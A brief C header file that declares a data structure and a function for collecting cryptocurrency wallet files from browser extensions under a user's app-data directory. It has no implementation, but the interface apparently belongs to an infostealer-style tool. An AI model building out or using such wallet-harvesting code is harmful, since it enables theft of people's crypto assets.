#ifndef WALLET_EXT_H
#define WALLET_EXT_H

#include <stddef.h>

typedef struct {
    char *name;
    char **files;
    size_t file_count;
    char *path;
} WalletExtData;

// Collect wallet files from browser extensions
WalletExtData *collect_wallet_extensions(const char *app_data, const char *path_suffix, size_t *count);

#endif
